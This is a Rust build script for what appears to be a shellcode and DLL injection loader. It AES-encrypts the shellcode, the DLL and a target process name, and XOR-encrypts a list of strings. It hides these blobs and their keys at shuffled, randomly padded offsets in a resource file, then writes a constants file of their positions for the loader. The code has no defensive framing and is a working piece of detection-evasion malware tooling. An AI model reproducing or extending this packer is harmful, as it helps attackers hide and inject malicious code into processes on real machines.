use rand;
use rand::seq::SliceRandom;
use rand::Rng;
use std::fs;
use std::ops::Range;
use std::path::Path;

include!("build_config.rs");
include!("build_util.rs");

type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);

struct XORString {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
    key: Vec<u8>,
    key_offset: usize,
}

pub struct ResourceGenerator {
    out_dir: String,
    aes_key: Vec<u8>,
    aes_key_offset: usize,
    aes_iv: Vec<u8>,
    aes_iv_offset: usize,
    target: Vec<u8>,
    target_offset: usize,
    shellcode: Vec<u8>,
    shellcode_offset: usize,
    dll: Vec<u8>,
    dll_offset: usize,
    xor_strings: Vec<XORString>,
}

impl ResourceGenerator {
    fn new(out_dir: String) -> Self {
        let aes_iv = generate_random_bytes(get_iv_len());
        let aes_key = generate_random_bytes(get_key_len());

        let target = if !TARGET_PROCESS.is_empty() {
            aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv)
        } else {
            vec![]
        };

        let shellcode = if !SHELLCODE_PATH.is_empty() {
            aes_encrypt_bytes(
                fs::read(SHELLCODE_PATH)
                    .expect("Could not read shellcode from disk.")
                    .as_slice(),
                &aes_key,
                &aes_iv,
            )
        } else {
            vec![]
        };

        let dll = if !DLL_PATH.is_empty() {
            aes_encrypt_bytes(
                fs::read(DLL_PATH)
                    .expect("Could not read shellcode from disk.")
                    .as_slice(),
                &aes_key,
                &aes_iv,
            )
        } else {
            vec![]
        };

        let xor_strings = XOR_STRINGS.iter().map(|string_name| {
            let key = generate_random_bytes(string_name.len());
            XORString {
                string_name,
                encrypted: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
                offset: usize::MAX,
                key,
                key_offset: usize::MAX,
            }
        }).collect();

        ResourceGenerator {
            out_dir,
            aes_key,
            aes_key_offset: usize::MAX,
            aes_iv,
            aes_iv_offset: usize::MAX,
            target,
            target_offset: usize::MAX,
            shellcode,
            shellcode_offset: usize::MAX,
            dll,
            dll_offset: usize::MAX,
            xor_strings,
        }
    }

    fn build_resource_file(&mut self) {
        let mut functions: Vec<BuildFn> = vec![
            ResourceGenerator::add_aes_key_to_payload,
            ResourceGenerator::add_aes_iv_to_payload,
            ResourceGenerator::add_shellcode_to_payload,
            ResourceGenerator::add_dll_to_payload,
            ResourceGenerator::add_target_to_payload,
        ];

        functions.resize(functions.len() + self.xor_strings.len(), ResourceGenerator::add_xor_string_to_payload);

        self.xor_strings.shuffle(&mut rand::thread_rng());
        functions.shuffle(&mut rand::thread_rng());
        let mut resource = vec![];
        for function in functions {
            function(self, &mut resource)
        }

        let end_pad = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        resource.extend(end_pad);

        fs::write(format!("{}/{}", self.out_dir, RESOURCE_NAME), resource)
            .expect("Could not write payload file.");
    }

    fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        self.target_offset = payload.len();
        payload.extend(&self.target);
    }

    fn add_xor_string_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        let mut xor_string = self.xor_strings.pop().expect("No string info to pop!");
        xor_string.offset = payload.len();
        payload.extend(&xor_string.encrypted);

        //put the key in after
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        xor_string.key_offset = payload.len();
        payload.extend(&xor_string.key);
        self.xor_strings.insert(0, xor_string);
    }

    fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        self.aes_key_offset = payload.len();
        payload.extend(&self.aes_key);
    }

    fn add_aes_iv_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        self.aes_iv_offset = payload.len();
        payload.extend(&self.aes_iv);
    }

    fn add_shellcode_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        self.shellcode_offset = payload.len();
        payload.extend(&self.shellcode);
    }

    fn add_dll_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
        payload.extend(bytes);

        self.dll_offset = payload.len();
        payload.extend(&self.dll);
    }

    fn build_consts_file(&self) {
        let mut consts = vec!["#![allow(unused)]".to_string()];

        consts.push(format!(
            "pub const {}: u32 = {:#X};",
            "RESOURCE_ID", RESOURCE_ID
        ));

        consts.push(format!("pub const {}: usize = {:#X};", "RT_RCDATA", 10));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_POS", self.aes_key_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_LEN",
            self.aes_key.len()
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_POS", self.aes_iv_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_LEN",
            self.aes_iv.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_POS", self.target_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_LEN",
            self.target.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_POS", self.shellcode_offset
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_LEN",
            self.shellcode.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "DLL_POS", self.dll_offset
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "DLL_LEN",
            self.dll.len()
        ));

        for string in &self.xor_strings {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
                string.encrypted.len()
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_KEY",
                string.key_offset
            ));
        }

        fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");
    }

    pub fn get_out_dir(&self) -> &str {
        &self.out_dir
    }
}
